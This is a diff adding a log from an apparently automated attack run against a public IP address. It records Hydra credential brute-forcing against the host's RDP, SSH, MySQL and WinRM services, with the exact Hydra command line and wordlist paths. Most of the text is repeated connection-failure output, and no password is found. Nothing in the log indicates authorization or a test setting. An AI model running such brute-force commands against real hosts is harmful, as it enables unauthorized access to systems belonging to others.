@@ -1,0 +1,243 @@
+=== ATTACK 101.206.185.116 Wed Aug  5 09:50:34 UTC 2026 ===
+[1] WinRM
+[done no hit]
+[2] MySQL
+[*] MySQL brute 101.206.185.116
+[3] RDP
+[*] RDP brute 101.206.185.116 (hydra - verify manually!)
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 09:58:09
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
+[DATA] attacking rdp://101.206.185.116:3389/
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+[ERROR] freerdp: The connection failed to establish.
+1 of 1 target completed, 0 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-05 09:58:56
+[!] RDP hits need manual verify (hydra false positives common)
+# Hydra v9.2 run at 2026-08-05 09:58:09 on 101.206.185.116 rdp (hydra -L /opt/msray/users.txt -P /opt/msray/pw_big.txt -t 3 -W 10 -f -o /tmp/brute_rdp_101.206.185.116.txt rdp://101.206.185.116)
+[4] SSH
+[*] SSH brute 101.206.185.116
+Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-05 09:58:56
+[DATA] max 3 tasks per 1 server, overall 3 tasks, 210 login tries (l:2/p:105), ~70 tries per task
+[DATA] attacking ssh://101.206.185.116:22/
+[ERROR] could not connect to ssh://101.206.185.116:22 - Timeout connecting to 101.206.185.116
+=== DONE Wed Aug  5 09:59:28 UTC 2026 ===
